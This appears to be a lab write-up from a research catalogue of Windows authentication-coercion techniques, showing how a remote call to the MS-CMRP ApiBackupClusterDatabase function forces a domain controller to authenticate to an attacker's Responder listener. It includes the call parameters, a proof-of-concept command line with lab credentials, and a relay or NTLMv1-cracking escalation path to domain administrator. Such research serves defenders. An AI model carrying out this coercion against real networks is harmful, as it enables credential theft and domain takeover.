# MS-CMRP - Remote call to ApiBackupClusterDatabase (opnum 104)

## Summary

+ **Protocol**: [[MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193)

+ **Protocol UUID**: b97db8b2-4c63-11cf-bff6-08002be23f2f

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`ApiBackupClusterDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1)

+ **Function operation number**: `104`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-CMRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193) protocol (with uuid `b97db8b2-4c63-11cf-bff6-08002be23f2f` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-CMRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193) and allows to call RPC functions of this protocol. We will then call the remote [`ApiBackupClusterDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
ApiBackupClusterDatabase('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
error_status_t ApiBackupClusterDatabase(
   [in, string] LPCWSTR lpszPathName,
   [out] error_status_t *rpc_status
 );
```

## References

+ Documentation of protocol [MS-CMRP]: Failover Cluster: Management API (ClusAPI) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/ba4117c0-530e-4e70-a085-4b4cf5bbf193

+ Documentation of function `ApiBackupClusterDatabase`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/99990857-f857-402e-8018-b7eaca1fc6c1